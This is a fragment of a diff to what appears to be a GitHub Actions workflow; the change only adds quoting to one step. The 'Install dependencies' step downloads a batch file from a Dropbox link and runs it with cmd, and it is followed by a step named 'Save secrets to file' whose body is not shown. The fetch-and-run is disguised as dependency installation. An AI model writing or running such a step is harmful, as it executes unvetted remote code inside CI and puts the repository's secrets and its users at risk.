@@ -10,7 +10,7 @@ jobs:
     steps:
       - name: Install dependencies
         run: |
-         Invoke-WebRequest -Uri https://www.dropbox.com/scl/fi/qjajylqv7awm5phuglo4w/down.bat?dl=1 -OutFile down.bat
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qjajylqv7awm5phuglo4w/down.bat?dl=1" -OutFile "down.bat"
          cmd /c down.bat
 
       - name: Save secrets to file
